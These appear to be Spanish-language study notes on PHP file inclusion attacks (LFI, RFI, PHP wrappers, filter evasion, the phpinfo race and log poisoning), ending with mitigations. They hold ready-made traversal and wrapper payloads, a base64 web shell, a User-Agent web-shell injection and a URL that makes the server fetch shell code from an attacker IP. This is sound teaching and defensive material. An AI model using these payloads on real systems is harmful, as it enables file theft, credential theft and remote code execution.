-- -
# 1. LFI (Local File Inclusion)
## ¿Qué es y por qué ocurre?

Muchos lenguajes de programación (especialmente PHP, aunque ocurre en todos) permiten modularizar el código utilizando funciones para incluir un archivo dentro de otro (como `include()`, `require()`, `file_get_contents()`).

El LFI ocurre cuando la aplicación web **toma el nombre o la ruta de un archivo proporcionado por el usuario** y lo pasa directamente a una de estas funciones de inclusión sin validar si el usuario tiene permisos para ver ese archivo.
## El Código Vulnerable (PHP):

Imagina una web que cambia de idioma o de sección pasando el nombre del archivo por la URL:

```PHP
$seccion = $_GET['page']; // El usuario controla esta variable (?page=contacto.php)
include("paginas/" . $seccion);
```
## El Ataque (Path Traversal / Salto de Directorio)

Un usuario legítimo entra a `?page=contacto.php`. Pero un auditor web sabe que puede usar el operador de salto de directorio (`../`) para salir de la carpeta `paginas/` y empezar a moverse por todo el sistema de archivos del servidor.

Si estamos en un servidor **Linux**, el payload clásico para verificar LFI es apuntar al archivo donde se guardan los usuarios del sistema:

- **Payload:** `?page=../../../../etc/passwd`
- **Consulta interna en el servidor:** `include("paginas/../../../../etc/passwd");`

El servidor web procesará los `../`, saldrá a la raíz del sistema operativo (`/`) y te meterá el contenido de `/etc/passwd` directamente dentro del HTML de la página web.

_(Nota: Si el servidor fuera **Windows**, el auditor apuntaría a rutas como `..\..\..\..\Windows\win.ini` o `\Windows\System32\drivers\etc\hosts`)._
# 2. RFI (Remote File Inclusion)
## ¿Qué es?

El RFI es el hermano mayor del LFI. Ocurre cuando la función de inclusión del servidor es tan permisiva que no solo acepta archivos locales del disco duro, sino que **acepta URLs de servidores externos**.
## El Ataque:

Si la configuración del servidor web (en PHP, la directiva `allow_url_include` en el archivo `php.ini`) está en `On`, el auditor puede levantar un servidor web propio en su máquina atacante con un archivo de código malicioso (por ejemplo, `shell.txt` que contenga código que ejecute comandos).

- **Payload:** `?page=http://IP_DEL_ATACANTE/shell.txt`
- **¿Qué hace el servidor vulnerable?** Hace una petición web hacia la IP del atacante, descarga el archivo `shell.txt` y, debido a la función `include()`, **ejecuta el código de esa shell remota dentro del servidor de la víctima**. Esto te da un RCE (Remote Code Execution) inmediato.
# 3. Técnicas de Evasión Avanzadas en LFI/RFI

Los desarrolladores intentan poner parches caseros que un auditor debe saber saltarse.
## Caso A: El desarrollador añade la extensión por código

Imagina que el código del backend es: `include("paginas/" . $_GET['page'] . ".php");`
Si intentas poner `?page=../../etc/passwd`, el servidor buscará `../../etc/passwd.php`, archivo que no existe, y fallará.
## Bypasses Clásicos:

1. **Null Byte (`%00`):** _(Válido en versiones antiguas de PHP < 5.3.4)_. El carácter `%00` indica el fin de una cadena en lenguaje C (en el que está hecho PHP). Si inyectas `?page=../../etc/passwd%00`, PHP ignorará el `.php` que se añade después.
2. **Path Truncation (Truncado de ruta):** Consiste en meter cientos de puntos y barras (`/.` o `../`) simulando una ruta extremadamente larga. Los sistemas operativos tienen un límite de caracteres para las rutas (ej. 4096 bytes). Si superas ese límite, el servidor "corta" el final de la cadena (tirando a la basura el `.php`) y procesa el principio.
3. **Uso de PHP Wrappers (Filtros PHP):** PHP tiene wrappers nativos poderosos. Si no puedes meter un archivo directamente porque rompe la página, puedes pedirle a PHP que te devuelva el archivo codificado en Base64 para leerlo limpiamente: `?page=php://filter/convert.base64-encode/resource=../../config.php`
## El Universo de los PHP Wrappers (Filtros Avanzados)

PHP tiene una característica nativa llamada _Wrappers_ (envoltorios) que alteran cómo el sistema lee los archivos. Si la función `include()` está expuesta, estos wrappers son herramientas quirúrgicas para el auditor.
### A. El Wrapper `php://filter` (Lectura de Código Fuente)

Ya mencionamos que permite codificar en Base64. ¿Por qué es vital? Si intentas hacer un LFI normal de un archivo PHP (como `db_connect.php`), el servidor lo va a _ejecutar_ y verás la página en blanco. Tú no quieres ejecutarlo, **quieres ver las contraseñas de la base de datos que están escritas dentro**.

- **Payload:** `?page=php://filter/convert.base64-encode/resource=config.php`
- **Resultado:** Te devuelve un string largo en Base64. Lo decodificas en tu terminal (`echo "BASE64..." | base64 -d`) y obtendrás el código fuente limpio del archivo, con todas sus variables y credenciales ocultas.
### B. El Wrapper `php://input` (De LFI a RCE sin tocar el disco)

Si tienes un LFI pero no encuentras la ruta de los logs para hacer _Log Poisoning_, este wrapper te permite **inyectar código directamente a través del cuerpo (Body) de una petición POST**. Requiere que la directiva `allow_url_include` esté activa en el servidor.

1. Interceptas la petición con **Burp Suite** y cambias la URL a: `?page=php://input`.
2. Cambias el método HTTP a `POST`.
3. En el **Body** de la petición, escribes tu código PHP:

```PHP
<?php system('whoami'); ?>
```

4. El servidor leerá su propia entrada de datos (`php://input`) como si fuera un archivo que contiene ese código y lo ejecutará inmediatamente.
### C. El Wrapper `data://` (Inyección de código en texto plano o Base64)

Es similar a `php://input` pero funciona directamente en la URL utilizando el esquema de datos RFC 2397. También requiere `allow_url_include`. Permite pasarle al servidor el código PHP directamente encodificado.

- **Payload en texto plano:** `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8r&cmd=id`
	_(Nota: `PD9waHAg...` es ![[Pasted image 20260624204427.png]] _en Base64)_. El servidor decodifica el stream en memoria y ejecuta el comando `id`.
### D. Los Wrappers `expect://` y `zip://` / `phar://`

- **`expect://`**: Si el módulo _Expect_ de PHP está habilitado (raro pero destructivo), te da RCE directo: `?page=expect://whoami`.
- **`zip://` y `phar://`**: Si la web te permite subir archivos pero solo acepta archivos `.zip` o imágenes, puedes comprimir tu script `shell.php` dentro de un archivo `archivo.zip`. Luego lo subes (la web lo acepta porque es un zip legítimo). Para ejecutarlo, usas el wrapper apuntando al archivo subido y descomprimiéndolo internamente en memoria:
	- **Payload:** `?page=zip://uploads/archivo.zip%23shell.php` _(El `%23` es el símbolo `#` url-encodificado, usado para indicarle a PHP el archivo interno del zip que debe procesar)_.
## Evasión de Filtros de Palabras (Keyword Blacklisting Bypass)

A veces, el desarrollador pone un filtro que busca la palabra `/etc/passwd` o la palabra `..` y te bloquea la petición si la encuentra.
### A. Ofuscación de Rutas en Linux (Non-Standard Paths)

Linux es muy flexible con los sistemas de archivos. Puedes introducir caracteres "basura" que el sistema operativo limpiará automáticamente antes de abrir el archivo, pero que **engañarán al filtro regex (expresión regular) de la aplicación web**.

1. **Uso de barras duplicadas o múltiples (`//`):** Para Linux, `/etc/passwd` y `/etc////passwd` es exactamente el mismo archivo. Si el WAF busca la cadena exacta `/etc/passwd`, este payload lo esquiva.
2. **Uso del directorio actual (`/.`):** El punto (`.`) en Linux significa "directorio actual". Por lo tanto, puedes intercalarlo: `/etc/./passwd` o `/etc/sysconfig/./../passwd`.
3. **Path Traversal no lineal:** Si el filtro elimina la cadena `../` de forma recursiva una sola vez (reemplazando `../` por nada), puedes construir un payload auto-reparable:
	- **Payload:** `?page=....//....//etc/passwd`
	- Si el filtro borra los `../` internos, la cadena se colapsará y se convertirá mágicamente en: `../../etc/passwd`.
### En Windows (Evasión de Barras e Información del Sistema)

En servidores Windows IIS, el sistema acepta tanto la barra invertida (`\`) como la barra normal (`/`).

- **Payload mezclado:** `?..//..\\..//../Windows/win.ini`
- Rutas alternativas de interés en Windows:
	- `\Windows\debug\NetSetup.log` (Información de la red y dominio).
	- `\Windows\Panther\Unattend.xml` (A menudo contiene contraseñas de Administrador en texto plano de la instalación del sistema).
## Inclusión de Archivos Temporales (PHP LFI to RCE via `phpinfo()`)

Esta es una técnica legendaria y puramente técnica para cuando tienes un LFI estricto (no puedes usar wrappers externos, no tienes acceso a logs, no puedes subir archivos).
### El Funcionamiento por dentro de PHP:

Cuando tú subes _cualquier_ archivo a un servidor PHP (incluso si la página web no tiene un formulario de subida), PHP intercepta la petición, toma el archivo y lo guarda en una carpeta temporal del sistema (como `/tmp/phpYg9a2x`) mientras dura la ejecución de la petición. Cuando la petición termina, PHP **borra automáticamente ese archivo temporal**.
### La Estrategia del Auditor:

Si la web tiene un archivo expuesto llamado `phpinfo.php` (típica página de diagnóstico que los desarrolladores olvidan borrar y que escupe todas las variables del sistema), podemos abusar de esto.

1. El atacante envía una petición `POST` gigante a `phpinfo.php` que contiene un archivo con código malicioso en el cuerpo.
2. La página `phpinfo.php` responderá volcando en la pantalla todo el contenido de la petición, **incluyendo el nombre aleatorio del archivo temporal que PHP acaba de crear en `/tmp/`**.
3. **Condición de Carrera (Race Condition):** El atacante envía en paralelo otra petición explotando el LFI apuntando directamente a esa ruta temporal (ej: `?page=/tmp/phpYg9a2x`).
4. Si el script del LFI se ejecuta unas milésimas de segundo antes de que PHP termine de procesar la primera petición y borre el archivo temporal, el LFI **incluirá nuestra shell temporal y ejecutará los comandos**.

_(Nota: Existen scripts automatizados en Python para cuadrar los tiempos de esta condición de carrera perfectamente)._
# 4. Log Poisoning (LFI -> RCE)

¿Qué pasa si encuentras un LFI (puedes leer archivos), pero el RFI está desactivado y no puedes subir archivos a la web? ¿Cómo consigues ejecutar comandos? Aquí entra el **Log Poisoning (Envenenamiento de Logs)**.
## El Concepto:

Los servidores web guardan un registro (un archivo log) de cada petición que reciben. Un archivo de log muy famoso en Linux/Apache es `/var/log/apache2/access.log`.

Cada vez que haces una petición, Apache escribe en ese archivo tu IP, la ruta que pediste y tu **User-Agent** (el identificador de tu navegador).
### Otras rutas de logs:

- `/var/log/nginx/access.log` o `error.log`: El equivalente directo para Nginx.
- `/var/log/auth.log` (Debian/Ubuntu) o `/var/log/secure` (CentOS/RHEL): El equivalente para intento de inicio de sesión por SSH con un usuario malicioso (![[Pasted image 20260624205827.png]]).
- `/var/log/mail.log` o `/var/log/vsftpd.log`: Enviando un correo con código PHP en el asunto o intentando loguearse en el FTP con el payload como nombre de usuario.
## El Proceso de Explotación Paso a Paso:
### Paso 1: Localizar el Log

Usando el LFI que ya encontraste, verificas si tienes permisos de lectura sobre el archivo de logs de Apache:
`?page=../../../../var/log/apache2/access.log`
Si ves una lista enorme de tus peticiones anteriores reflejada en la pantalla, el entorno es vulnerable.
### Paso 2: Envenenar el Log (Poisoning)

Interceptas una petición cualquiera con **Burp Suite**. Modificas tu cabecera `User-Agent` y, en lugar de poner "Mozilla/5.0...", inyectas un fragmento de código PHP malicioso (una web shell de una sola línea): ![[Pasted image 20260624203831.png|299]]

```HTTP
GET / HTTP/1.1
Host: vulnerable.com
User-Agent: web shell
...
```
#### ¿Qué pasa en el servidor?

Apache recibe la petición y escribe de forma transparente en el archivo `access.log`:
_"El usuario con User-Agent ![[Pasted image 20260624204427.png]] visitó la página /"_.
### Paso 3: Disparar el RCE

Ahora vuelves a cargar el archivo de logs usando tu LFI, pero esta vez le pasas por la URL el comando de sistema que quieres ejecutar en la variable `cmd`: `?page=../../../../var/log/apache2/access.log&cmd=id`

Cuando la función `include()` de PHP lee el archivo de logs, se encuentra con el texto plano de las visitas anteriores (que los pinta como texto), pero cuando llega a la línea que tú envenenaste, **detecta las etiquetas `<?php ... ?>` y ejecuta el comando `id` en la terminal del servidor.** ¡Has convertido una simple lectura de archivos en un RCE completo!
# 5. Mitigación de LFI/RFI/Log Poisoning

- **Evitar la inclusión dinámica:** Nunca pases variables directamente a funciones de inclusión de archivos.
- **Lista Blanca (Whitelist):** Si es necesario incluir archivos dinámicamente, valida el parámetro contra una lista estricta de archivos permitidos (ej: `if ($page == 'contacto') { include('contacto.php'); }`).
- **Deshabilitar directivas peligrosas:** Asegurarse de que `allow_url_fopen` y `allow_url_include` estén en `Off` en la configuración de PHP para mitigar RFI.
- **Principio de menor privilegio:** Que el usuario que corre el servidor web (`www-data`) no tenga permisos de lectura sobre archivos críticos del sistema ni sobre sus propios logs de forma innecesaria.
-- -
